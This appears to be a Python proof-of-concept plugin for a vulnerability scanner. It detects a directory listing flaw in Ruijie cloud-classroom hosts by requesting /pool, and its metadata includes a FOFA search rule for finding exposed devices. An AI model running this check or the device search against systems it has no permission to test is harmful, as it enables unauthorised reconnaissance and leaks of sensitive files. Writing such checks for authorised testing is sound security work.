import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def vuln_info():
    info={
        'vuln_name': '锐捷云课堂主机目录遍历漏洞',
        'vuln_referer':'http://wiki.peiqi.tech/',
        'vuln_author':'Bob',
        'cms_name':'锐捷',
        'vuln_description':'''锐捷云课堂主机存在目录遍历漏洞，通过访问get请求/pool/，即可读取目录.导致敏感信息泄露.''',
        'vuln_identifier':''' ''',
        'vuln_class':'目录遍历',
        'vuln_solution':'''建议相关用户尽快联系官方对受影响范围内的设备系统进行升级，官方链接：http://www.ruijie.com.cn''',
        'FofaQuery_type':'socket',
        'FofaQuery_link':'all',
        'FofaQuery_rule':'title="Ruijie" && "云课堂主机"',
        'ispoc':1,
        'isexp':0
    }
    return info


def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    result = {"Result":False,"Result_Info":""}
    vuln_url = url + "/pool"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10)
        if "Filename" in response.text and response.status_code == 200:
            result['Result'] = True
            result['Result_Info'] = "存在目录遍历漏洞：" + vuln_url
        else:
            result['Result_Info'] = '不存在漏洞'
    except Exception as e:
        func_out('Error',str(e) + str(e.__traceback__.tb_lineno) + '行')
    return result


if __name__ == '__main__':
    url = 'xxx'
    aa = do_poc(url, '', '', '', heads={})
    print(aa)